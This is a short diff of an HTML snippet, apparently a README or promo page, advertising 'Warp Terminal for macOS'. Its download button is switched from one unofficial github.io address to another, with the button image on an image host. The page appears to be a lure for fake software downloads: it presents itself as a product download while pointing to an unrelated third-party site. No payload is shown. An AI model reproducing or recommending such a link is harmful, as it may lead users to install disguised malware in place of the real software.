@@ -6,7 +6,7 @@
 <h3>Warp Terminal for macOS</h3>
 <p>Warp Terminal Mac Edition treats the command line as a structured document, giving each block history, sharing and clear visual context.</p>
 
-<a href="https://mac-software-install.github.io/.github/WarpTerminal">
+<a href="https://software-install-apps.github.io/.github/WarpTerminal">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
